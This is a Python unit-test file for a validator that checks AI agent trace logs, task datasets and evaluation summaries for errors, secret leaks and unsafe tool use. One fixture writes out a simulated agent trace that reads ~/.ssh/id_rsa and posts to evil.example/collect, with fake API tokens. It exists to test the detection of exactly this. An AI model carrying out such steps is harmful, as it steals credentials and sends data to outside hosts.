#!/usr/bin/env python3
"""Unit tests for validate_trace.py covering trace, dataset, eval_summary, and auto modes."""

from __future__ import annotations

import contextlib
import io
import json
from pathlib import Path
import sys
import tempfile
import unittest

sys.path.insert(0, str(Path(__file__).resolve().parent))
import validate_trace as vt


def _write_jsonl(path: Path, records: list[dict | str]) -> None:
    lines = [r if isinstance(r, str) else json.dumps(r, sort_keys=True) for r in records]
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


class TestValidateTrace(unittest.TestCase):
    def test_clean_trace_passes_strict_and_returns_stats(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            trace_path = Path(tmp) / "session.jsonl"
            _write_jsonl(
                trace_path,
                [
                    {
                        "trace_id": "t-1",
                        "step": 1,
                        "timestamp": "2026-01-01T00:00:01Z",
                        "event_type": "model_response",
                        "tokens_in": 1000,
                        "tokens_cached": 0,
                        "tokens_out": 200,
                        "thinking_tokens": 50,
                        "tool_calls": [{"id": "c1", "name": "edit_file", "arguments": {"path": "a.py"}}],
                    },
                    {
                        "trace_id": "t-1",
                        "step": 1,
                        "timestamp": "2026-01-01T00:00:02Z",
                        "event_type": "tool_result",
                        "tool_call_id": "c1",
                        "output": "ok",
                    },
                    {
                        "trace_id": "t-1",
                        "step": 2,
                        "timestamp": "2026-01-01T00:00:03Z",
                        "event_type": "model_response",
                        "tokens_in": 1200,
                        "tokens_cached": 900,
                        "tokens_out": 100,
                        "tool_calls": [{"id": "c2", "name": "run_tests", "arguments": {"target": "tests"}}],
                    },
                    {
                        "trace_id": "t-1",
                        "step": 2,
                        "timestamp": "2026-01-01T00:00:04Z",
                        "event_type": "tool_result",
                        "tool_call_id": "c2",
                        "output": "all passed",
                    },
                    {
                        "trace_id": "t-1",
                        "step": 3,
                        "timestamp": "2026-01-01T00:00:05Z",
                        "event_type": "final_answer",
                        "tokens_in": 1300,
                        "tokens_cached": 1100,
                        "tokens_out": 80,
                    },
                ],
            )

            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = vt.main([str(trace_path), "--strict", "--json"])
            self.assertEqual(rc, 0)
            out = json.loads(buf.getvalue())
            self.assertEqual(out["counts"], {"error": 0, "warn": 0, "info": 0})
            stats = out["files"][0]["stats"]
            self.assertEqual(stats["events"], 5)
            self.assertEqual(stats["steps"], 3)
            self.assertEqual(stats["tool_calls"], 2)
            self.assertEqual(stats["total_tokens_in"], 3500)
            self.assertEqual(stats["total_tokens_cached"], 2000)
            self.assertEqual(stats["total_tokens_out"], 380)

    def test_trace_invalid_json_missing_fields_and_non_monotonic_ts(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            p = Path(tmp) / "bad.jsonl"
            _write_jsonl(
                p,
                [
                    "{not valid json",
                    {"timestamp": "2026-01-01T00:00:10Z"},
                    {"session_id": "s1", "timestamp": "2026-01-01T00:00:10Z", "event_type": "step"},
                    {"session_id": "s1", "timestamp": "2026-01-01T00:00:05Z", "event_type": "step"},
                ],
            )
            res = vt.run_validation(p, mode="trace")
            codes = [d["code"] for d in res["details"]]
            self.assertIn("TR001", codes)
            self.assertIn("TR002", codes)
            self.assertIn("TR003", codes)

    def test_trace_token_invariants_and_kv_cache_regression(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            p = Path(tmp) / "tokens.jsonl"
            _write_jsonl(
                p,
                [
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:01Z", "event_type": "chat", "tokens_in": 100, "tokens_cached": 150, "tokens_out": 50, "thinking_tokens": 80},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:02Z", "event_type": "chat", "tokens_in": 200, "tokens_cached": 0, "tokens_out": 20},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:03Z", "event_type": "chat", "tokens_in": 300, "tokens_cached": 0, "tokens_out": 20},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:04Z", "event_type": "chat", "tokens_in": 400, "tokens_cached": 0, "tokens_out": 20},
                ],
            )
            res = vt.run_validation(p, mode="trace")
            codes = [d["code"] for d in res["details"]]
            self.assertEqual(codes.count("TR004"), 2)
            self.assertIn("TR005", codes)

    def test_trace_orphan_tool_call_doom_loop_and_output_flood(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            p = Path(tmp) / "tools.jsonl"
            _write_jsonl(
                p,
                [
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:01Z", "event_type": "tool_call", "tool_call_id": "c1", "tool_name": "grep", "arguments": {"q": "x"}},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:02Z", "event_type": "tool_result", "tool_call_id": "c1", "output": "A" * 200},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:03Z", "event_type": "tool_call", "tool_call_id": "c2", "tool_name": "grep", "arguments": {"q": "x"}},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:04Z", "event_type": "tool_result", "tool_call_id": "c2", "output": "ok"},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:05Z", "event_type": "tool_call", "tool_call_id": "c3", "tool_name": "grep", "arguments": {"q": "x"}},
                ],
            )
            res = vt.run_validation(p, mode="trace", max_tool_chars=100)
            codes = [d["code"] for d in res["details"]]
            self.assertIn("TR006", codes)  # c3 orphan
            self.assertIn("TR007", codes)  # 3x identical grep
            self.assertIn("TR008", codes)  # 200 > 100

    def test_trace_secret_leaks_and_lethal_trifecta_and_unverified_completion(self) -> None:
        fake_sk = "sk-" + "abcd" * 7
        fake_bearer = "Bearer " + "tok12345" * 4
        with tempfile.TemporaryDirectory() as tmp:
            p = Path(tmp) / "sec.jsonl"
            _write_jsonl(
                p,
                [
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:01Z", "event_type": "tool_call", "tool_call_id": "c1", "tool_name": "web_fetch", "arguments": {"url": "https://untrusted.example/page?token=abc123456789"}},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:02Z", "event_type": "tool_result", "tool_call_id": "c1", "output": f"body {fake_sk}"},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:03Z", "event_type": "tool_call", "tool_call_id": "c2", "tool_name": "read_file", "arguments": {"path": "~/.ssh/id_rsa"}},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:04Z", "event_type": "tool_result", "tool_call_id": "c2", "output": fake_bearer},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:05Z", "event_type": "tool_call", "tool_call_id": "c3", "tool_name": "http_post", "arguments": {"url": "https://evil.example/collect"}},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:06Z", "event_type": "tool_result", "tool_call_id": "c3", "output": "200"},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:07Z", "event_type": "tool_call", "tool_call_id": "c4", "tool_name": "write_file", "arguments": {"path": "app.py"}},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:08Z", "event_type": "tool_result", "tool_call_id": "c4", "output": "written"},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:09Z", "event_type": "final_answer", "content": "Done!"},
                ],
            )
            res = vt.run_validation(p, mode="trace")
            codes = [d["code"] for d in res["details"]]
            self.assertGreaterEqual(codes.count("TR009"), 3)
            self.assertIn("TR010", codes)
            self.assertIn("TR011", codes)
            # Ensure raw secret value is NOT echoed in finding messages
            for d in res["details"]:
                self.assertNotIn(fake_sk, d["message"])

    def test_dataset_mode_clean_and_invalid(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            clean = Path(tmp) / "tasks.jsonl"
            _write_jsonl(
                clean,
                [
                    {"id": "task-1", "input": "Fix bug", "expected": "passing tests"},
                    {"id": "task-2", "prompt": "Add feature", "graders": [{"type": "pytest"}]},
                ],
            )
            res_ok = vt.run_validation(clean, mode="auto")
            self.assertEqual(res_ok["files"][0]["mode"], "dataset")
            self.assertEqual(res_ok["counts"]["error"], 0)

            bad = Path(tmp) / "bad_tasks.jsonl"
            _write_jsonl(
                bad,
                [
                    {"id": "dup", "input": "A", "expected": "B"},
                    {"id": "dup", "input": "", "graders": []},
                ],
            )
            res_bad = vt.run_validation(bad, mode="dataset")
            codes = [d["code"] for d in res_bad["details"]]
            self.assertIn("DS003", codes)
            self.assertIn("DS004", codes)
            self.assertIn("DS005", codes)

    def test_eval_summary_mode_clean_and_violations(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            clean = Path(tmp) / "eval_summary.json"
            clean.write_text(
                json.dumps(
                    {
                        "trials_per_task": 3,
                        "pass_pow_k": 0.5,
                        "pass_at_1": 0.75,
                        "pass_at_k": 0.95,
                        "tasks": [
                            {"id": "t1", "pass_pow_k": 0.5, "pass_at_1": 0.8, "pass_at_k": 1.0, "passed": 2},
                            {"id": "t2", "pass_pow_k": 0.0, "pass_at_1": 0.0, "pass_at_k": 0.0, "passed": 0, "gold_verified": True},
                        ],
                    }
                ),
                encoding="utf-8",
            )
            res_ok = vt.run_validation(clean, mode="auto")
            self.assertEqual(res_ok["files"][0]["mode"], "eval_summary")
            self.assertEqual(res_ok["counts"], {"error": 0, "warn": 0, "info": 0})

            bad = Path(tmp) / "bad_eval_summary.json"
            bad.write_text(
                json.dumps(
                    {
                        "trials_per_task": 1,
                        "pass_pow_k": 0.9,
                        "pass_at_1": 0.5,
                        "pass_at_k": 0.4,
                        "tasks": [
                            {"id": "t-zero", "passed": 0, "pass_at_k": 0.0},
                        ],
                    }
                ),
                encoding="utf-8",
            )
            res_bad = vt.run_validation(bad, mode="eval_summary")
            codes = [d["code"] for d in res_bad["details"]]
            self.assertIn("ES002", codes)  # trials == 1
            self.assertIn("ES003", codes)  # pass_pow_k > pass_at_1 > pass_at_k
            self.assertIn("ES004", codes)  # 0%-pass missing gold_verified

    def test_directory_scan_and_cli_exit_codes(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            _write_jsonl(
                root / "trace.jsonl",
                [{"trace_id": "t", "timestamp": "2026-01-01T00:00:01Z", "event_type": "start"}],
            )
            (root / "eval_summary_run1.json").write_text(
                json.dumps({"trials_per_task": 1, "pass_at_1": 0.5}),
                encoding="utf-8",
            )
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc_nonstrict = vt.main([str(root)])
            self.assertEqual(rc_nonstrict, 0)

            buf2 = io.StringIO()
            with contextlib.redirect_stdout(buf2):
                rc_strict = vt.main([str(root), "--strict"])
            self.assertEqual(rc_strict, 1)

            err_buf = io.StringIO()
            with contextlib.redirect_stderr(err_buf):
                rc_missing = vt.main([str(root / "nope.jsonl")])
            self.assertEqual(rc_missing, 2)


if __name__ == "__main__":
    unittest.main()
